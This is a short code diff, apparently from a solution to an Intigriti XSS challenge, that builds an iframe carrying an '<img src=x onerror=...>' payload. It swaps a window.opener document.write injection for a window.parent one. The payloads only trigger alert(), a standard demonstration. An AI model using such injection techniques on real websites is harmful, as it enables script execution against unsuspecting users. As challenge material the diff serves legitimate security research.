@@ -6,12 +6,7 @@
     iframe.name = 'helloworld';
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
     iframe.onclick = function(e){
-      if(window.opener){
-          window.opener.document.write('<img src=x onerror=alert(document.domain)>')
-      }
-      else{
-          alert('2')
-      }
+      window.parent.document.write('<img src=x onerror=alert()>')
     }
     document.body.appendChild(iframe);
   </script>
